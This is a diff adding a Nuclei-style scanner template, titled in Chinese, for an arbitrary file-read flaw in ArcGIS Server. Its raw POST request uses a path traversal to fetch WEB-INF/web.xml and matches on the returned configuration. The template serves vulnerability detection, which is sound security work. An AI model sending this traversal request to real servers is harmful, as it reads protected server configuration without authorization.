@@ -1,0 +1,31 @@
+id: ArcGIS-File-reading
+
+info:
+  name: ArcGIS地理信息系统任意文件读取漏洞
+  author: ArcGIS
+  severity: high
+  tags: File reading
+
+
+http:
+  - raw:
+      - |
+        POST /arcgis/manager/3370/js/../WEB-INF/web.xml HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'ArcGIS Server Manager'
+          - '<web-app'
+          - '</web-app>'
+        condition: and
+      - type: status
+        status: 
+          - 200
+
+
+
